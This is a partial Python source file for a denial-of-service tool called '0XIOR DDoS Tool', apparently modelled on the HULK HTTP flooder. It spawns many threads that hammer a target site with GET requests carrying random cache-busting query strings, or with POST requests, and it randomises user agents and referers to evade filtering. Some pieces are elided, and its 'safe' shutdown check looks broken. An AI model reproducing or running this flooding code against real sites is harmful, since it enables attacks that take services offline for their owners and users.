...
class ArrayFlags(argparse.Action):
...
def main():
    parser = argparse.ArgumentParser(description="0XIOR DDoS Tool")
    parser.add_argument("-v", "--version", action="store_true", help="print version and exit")
    parser.add_argument("-s", "--safe", action="store_true", help="Autoshut after dos.")
    parser.add_argument("-t", "--site", default="http://localhost", help="Destination site.")
    parser.add_argument("-a", "--agents", default="", help="Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
    parser.add_argument("-d", "--data", default="", help="Data to POST. If present hulk will use POST requests instead of GET")
    parser.add_argument("-H", "--header", action=ArrayFlags, nargs="+", help="Add headers to the request. Could be used multiple times")
    args = parser.parse_args()

    if args.version:
        print(f"0XIOR {__version__}")
        sys.exit(0)
    ...
    def attack_loop():
        nonlocal err_count, sent_count
        global cur, maxproc
        while True:
            if cur < maxproc - 10000:
                threading.Thread(target=http_call, args=(site, u.netloc, data, headers, ss)).start()
                cur += 1
            if sent_count % 250 == 0:
                print(f"\rSent: {sent_count} | Errors: {err_count}", end="")
            signal = ss.get()
            if signal == call_exit_on_err:
                cur -= 1
                err_count += 1
            elif signal == call_exit_on_too_many_files:
                cur -= 1
                maxproc -= 1
            elif signal == call_got_ok:
                sent_count += 1
            elif signal == target_complete:
                sent_count += 1
                print("\r-- Executor Attack Finished --\n\n")
                sys.exit(0)
...
def http_call(url, host, data, headers, queue):
    global cur
    ...
    while True:
        try:
            if data == "":
                request_url = f"{url}{param_joiner}{build_block(random.randint(3, 10))}={build_block(random.randint(3, 10))}"
                response = client.get(request_url, headers=build_headers(host, headers))
            else:
                response = client.post(url, data=data, headers=build_headers(host, headers))

            queue.put(call_got_ok)
            if safe and response.status_code >= 1000:
                queue.put(target_complete)

        except requests.exceptions.RequestException as e:
            if "too many open files" in str(e):
                                queue.put(call_exit_on_too_many_files)
            else:
                queue.put(call_exit_on_err)
            return

def build_headers(host, custom_headers):
    headers = {
        "User-Agent": random.choice(headers_useragents),
        "Cache-Control": "no-cache",
        "Accept-Charset": accept_charset,
        "Referer": random.choice(headers_referers) + build_block(random.randint(10, 20)),
